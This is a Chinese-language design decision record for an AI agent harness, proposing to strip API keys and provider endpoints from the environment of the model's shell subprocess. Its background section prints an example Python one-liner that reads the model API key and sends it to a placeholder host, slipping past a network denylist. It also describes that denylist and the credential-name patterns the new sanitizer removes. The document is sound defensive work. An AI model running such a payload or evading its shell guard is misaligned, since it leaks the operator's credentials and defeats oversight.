# ADR-0020：模型 shell 子环境清除 provider 凭据（denylist 守命令·env 清洗守 payload）

- 状态：Proposed（2026-07-05）
- 关联：[ADR-0016 认知归模型/边界归状态]、[[freeze-lifted-autonomous-loop]]、[[commercial-readiness-audit]] P0①、`security/shell_guard.py`、`security/env_sanitizer.py`、`tools/command_tools.py`
- 触发：2026-07-05 用户选定"先硬化沙箱/shell 边界"作为闭合自主环后的前置安全垫（内部定位下审计 P0 沙箱降为加固项，只修 footgun）。

## 1. 背景（Context）

模型面 shell 工具 `RunCommandTool._env()` 此前 `os.environ.copy()`——**子进程继承全量父环境**，包含 harness 自己的 provider 凭据（本机实测 env 里就有 `AGENT_MODEL_API_KEY`/`AGENT_MODEL_STRONG_API_KEY`/`ANTHROPIC_BASE_URL`）。模型一句 `run_command` 就能读到并（配合任一出网手段）外传。

`ShellGuard` 是成熟静态 denylist（拦网络/破坏/远程/部署/装包/读密文件），但**其 docstring 自认残留**：静态扫描无法容纳解释器 payload——`python -c "import os,urllib.request; urllib.request.urlopen('http://x/'+os.environ['AGENT_MODEL_API_KEY'])"` 在代码里构造请求，绕过网络 denylist。这是审计 P0①"解释器一行绕出网"的实体。

## 2. 决策（Decision）

**纵深防御：denylist 守命令，env 清洗守 payload。** 就算解释器绕过网络拦截，子环境里没有 secret 就无可外传。

- 新增 `security/env_sanitizer.py::sanitize_subprocess_env(env=None) -> (scrubbed, removed_names)`：按**名字**去除凭据类变量——marker 子串（`api_key/apikey/secret/password/passwd/token/credential/private_key/access_key/...`，沿用 `mcp_adapter._sensitive_key` 约定并加宽）+ harness/provider 配置前缀（`agent_model_/anthropic_/openai_/azure_openai_`，连端点一起清，令 payload 连网关都发现不了）。其他变量（PATH/SYSTEMROOT/TEMP/LANG...）**全部保留**，普通命令照跑。
- `RunCommandTool._env()` 改用它。**不影响真模型调用**（harness 进程内直接用 `os.environ` 的 key 发调用，不走 run_command）；只影响模型 shell 的 child env。
- **默认失败关闭（fail-closed on secrets）·无 opt-out flag**：模型的编码 shell 没有正当理由看到 harness provider 凭据；若某任务确需某 app 凭据，应经任务显式注入而非继承 harness secret（另行设计，不在本 ADR）。

## 3. ADR-0016 合规

- **边界归状态**：进程环境的信任边界从"隐式继承全部"变为**显式清单**（凭据剥离、普通变量保留）。这是把边界钉进状态、认知仍归模型——不改模型任何决策路径，只收紧它能触到的秘密面。

## 4. 回滚（Rollback）

`_env()` 改回 `os.environ.copy()` 即全回退；删 `env_sanitizer.py` + 测试。无 schema、无 flag、无策略迁移。

## 5. 一致性检查（Conformance）

- `tests/unit/test_env_sanitizer.py`：marker/prefix 命中与保留、去 secret 保其余、默认读 `os.environ`、不改源 dict。
- `tests/integration/test_shell_env_scrub.py`：**真端到端**——`monkeypatch` 设 `AGENT_MODEL_API_KEY`，经真实 `RunCommandTool.run` 跑解释器 payload，断言 stdout `KEY=<absent>`、secret 值不出现、非凭据 `PLAIN` 保留。
- 残留（诚实标注）：本清洗只挡"外传 harness 凭据"；不挡任意出网/写本地文件（那仍归 ShellGuard + 未来 OS 沙箱）。内部可信团队定位下，这是加固项而非完整多租户隔离。
